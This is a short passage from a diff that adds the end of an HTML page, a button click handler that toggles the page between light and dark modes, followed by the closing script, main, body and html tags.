+      btn.addEventListener("click", function() {
+        togglePageContentLightDark();
+      });
+      </script>
+    </main>
+  </body>
+</html>
